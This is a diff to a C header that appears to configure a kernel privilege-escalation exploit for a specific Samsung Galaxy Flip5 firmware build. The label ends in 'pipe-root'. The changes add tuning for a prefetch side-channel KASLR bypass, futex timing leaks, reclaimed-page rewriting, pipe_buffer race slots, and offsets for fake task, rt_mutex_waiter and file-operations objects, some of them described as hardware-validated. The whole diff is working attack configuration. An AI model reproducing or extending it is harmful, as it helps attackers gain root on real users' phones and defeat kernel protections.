@@ -28,12 +28,50 @@
 #define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
-#define BUILD_VARIANT_LABEL "b5q-F731BXXS7GZF1-mcast-tracefs-shaped-configfs-pipe-root"
+#define BUILD_VARIANT_LABEL \
+  "b5q-F731BXXS7GZF1-mcast-p0-page-reuse-configfs-pipe-root"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_TRACEFS_SLIDE 1
+#define APP_PREFETCH_SLIDE 1
+#define APP_PREFETCH_SLIDE_DEFAULT 0
+#define SLIDE_PREFETCH_SCAN_STEP 0x8000ULL
+#define SLIDE_PREFETCH_MAX_OFFSET 0x1f0000ULL
+#define SLIDE_PREFETCH_SAMPLES 32
+#define SLIDE_PREFETCH_BURST 512
+#define SLIDE_PREFETCH_EDGE_RUN 8
+#define SLIDE_PREFETCH_REPEATS 5
+#define SLIDE_PREFETCH_MIN_CONSENSUS 3
 #define APP_CLOSED_FOPS_ROUTE 1
+#define APP_FOPS_REUSE_VERIFIED_PAGE 1
+#define APP_FOPS_REWRITE_RECLAIMED_PAGE 1
 #define APP_CONTROLLED_MM_GROUP_RECLAIM 1
+/*
+ * Keep retries inside the one fresh P0 child.  A clean gate miss has not
+ * modified P0 and can safely reclaim another page; restarting a supervisor
+ * after a real gate hit cannot be made safe.  Gate/probe/restore slots are
+ * idempotent and get three independent race windows because the trigger's
+ * return value alone cannot confirm that the pipe_buffer changed.
+ */
+#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 2
+#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
+#define APP_P0_REDUNDANT_SLOT_WRITES 3
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 3
+#define APP_FOPS_FINE_DELAY_PER_ROUTE 1
+/*
+ * A complete controlled order-3 page needs 32 retained mm_struct objects.
+ * Collision measurement dominates that collection time.  Try the sampling
+ * depth hardware-validated by the E2S fast profile remains available for
+ * diagnostics, while retaining the original 128/8 profile as an automatic
+ * per-object fallback in util.c.  It produced no successful leaks in the
+ * Flip5 hardware trials, so do not pay its setup cost by default.  Set
+ * RMG_CONTROLLED_FAST=1 explicitly for future A/B tests.
+ */
+#define APP_CONTROLLED_FAST_KSNITCH 1
+#define APP_CONTROLLED_FAST_KSNITCH_DEFAULT 0
+#define CONTROLLED_KSNITCH_FAST_APPENDED_FUTEXES 256
+#define CONTROLLED_KSNITCH_FAST_REPEAT_MEASUREMENT 32
+#define CONTROLLED_KSNITCH_FAST_AVERAGE 4
 #define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
 #define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
   0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
@@ -431,7 +469,7 @@
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 4
+#define SLIDE_BANK_SLOTS 5
 #define SLIDE_BANK_TASK_OFF 0x1000
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
@@ -462,6 +500,7 @@
 #define P0_ORACLE_PROBE_SLOT 1
 #define P0_ORACLE_GATE_RESTORE_SLOT 2
 #define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_PRODUCTION_SLOT 4
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 
@@ -587,10 +626,24 @@
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
 #define FOPS_OFF 0x2000
-#define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
+#define SCRATCH_OFF 0x3000
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+/* Dedicated compact layout for rewriting the verified P0 page.  The normal
+ * fresh-page fallback keeps the hardware-validated offsets above. */
+#define APP_REUSED_FOPS_PAGE_SOURCE_OFF 0x0e80
+#define APP_REUSED_FOPS_PAGE_PRESERVE 0x0100
+#define APP_REUSED_FOPS_FOPS_OFF 0x1000
+#define APP_REUSED_FOPS_RIGHT_OFF 0x1140
+#define APP_REUSED_FOPS_LEFT_OFF 0x1180
+#define APP_REUSED_FOPS_LOCK_OFF 0x1210
+#define APP_REUSED_FOPS_WAITER_OFF 0x1350
+#define APP_REUSED_FOPS_TASK_OFF 0x1480
+#define APP_REUSED_FOPS_SCRATCH_OFF 0x1d80
+#endif
 
 /* struct rt_mutex_waiter (BTF, size 0x58) -- COMPACT layout.
  * FAKE_WAITER_LAYOUT_SIZE derives to ww_ctx + 8 == 0x58, matching BTF. */
